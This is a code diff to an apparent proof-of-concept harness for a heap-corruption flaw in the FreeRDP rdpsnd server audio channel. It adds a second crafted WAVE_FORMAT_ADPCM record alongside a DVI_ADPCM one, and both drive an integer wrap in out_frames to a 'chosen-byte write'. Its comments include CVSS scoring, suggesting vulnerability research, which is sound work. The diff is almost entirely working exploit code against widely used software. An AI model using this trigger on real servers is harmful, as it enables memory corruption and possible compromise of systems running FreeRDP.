@@ -15,8 +15,10 @@
  * channel transport, network path or auth gate. Those remain UNKNOWN.
  * Default posture is post-auth (PR:L, CVSS 8.8); 9.8 only for no-auth.
  *
- * Usage: PocRdpsndChannelDispatch [benign] — "benign" frames one PCM record,
- * which must yield out_frames=0x89d and no chosen-byte write.
+ * Usage: PocRdpsndChannelDispatch [benign|adpcm]. Default frames the
+ * DVI_ADPCM record; "adpcm" frames WAVE_FORMAT_ADPCM nBlockAlign=8,
+ * nChannels=2, a tag the shadow server offers by default. "benign" frames one
+ * PCM record, which must yield out_frames=0x89d and no chosen-byte write.
  */
 #include <freerdp/codec/audio.h>
 #include <freerdp/channels/channels.h>
@@ -31,6 +33,9 @@ static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NUL
 static BYTE dvi_ext[2] = { 0xf9, 0x07 };
 static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };
 
+static AUDIO_FORMAT fmt_adpcm = { WAVE_FORMAT_ADPCM, 2, 44100, 176400, 8, 16, 0, NULL };
+static AUDIO_FORMAT* g_bad = &fmt_dvi;
+static size_t g_expected_frames = (size_t)-16;
 /* Real 3.32.0 server source; supplies the static parser, the dispatcher's
  * callees and the real select/send implementations in this translation unit. */
 #include "rdpsnd_main.c"
@@ -89,7 +94,7 @@ static void frame_pdu(int malicious)
 	Stream_Write_UINT8(s, 0);    /* bPad */
 	audio_format_write(s, &fmt_pcm);
 	if (malicious)
-		audio_format_write(s, &fmt_dvi);
+		audio_format_write(s, g_bad);
 
 	total = Stream_GetPosition(s);
 	Stream_SetPosition(s, 2);
@@ -102,6 +107,13 @@ static void frame_pdu(int malicious)
 int main(int argc, char** argv)
 {
 	int malicious = (argc < 2) || (strcmp(argv[1], "benign") != 0);
+	const char* mode = (argc >= 2) ? argv[1] : "dvi";
+	if (argc >= 2 && strcmp(argv[1], "adpcm") == 0)
+	{
+		g_bad = &fmt_adpcm;
+		/* (8 - 7*2)*2/2 + 2 = -4, widened to UINT64 by select_format. */
+		g_expected_frames = (size_t)-4;
+	}
 	RdpsndServerContext* ctx = NULL;
 	volatile BYTE* out = NULL;
 	BYTE *b1 = NULL, *b2 = NULL;
@@ -161,7 +173,7 @@ int main(int argc, char** argv)
 	}
 	/* The failed realloc returns CHANNEL_RC_NO_MEMORY (12) but leaves the
 	 * wrapped out_frames in place; that is the vulnerable state we drive. */
-	if (rcsel != CHANNEL_RC_NO_MEMORY || ctx->priv->out_frames != (size_t)-16 ||
+	if (rcsel != CHANNEL_RC_NO_MEMORY || ctx->priv->out_frames != g_expected_frames ||
 	    ctx->priv->out_buffer_size != 8820)
 	{
 		ok = 0;
@@ -187,7 +199,8 @@ int main(int argc, char** argv)
 	     (ctx->priv->out_pending_frames == 8192);
 
 done:
-	printf("[dispatch] %s RESULT=%s\n", malicious ? "chosen" : "benign", ok ? "PASS" : "FAIL");
+	printf("[dispatch] mode=%s %s RESULT=%s\n", mode, malicious ? "chosen" : "benign",
+	       ok ? "PASS" : "FAIL");
 	/* The malicious case corrupts the heap; skip destructors after flushing. */
 	fflush(stdout);
 	_exit(ok ? 0 : 1);
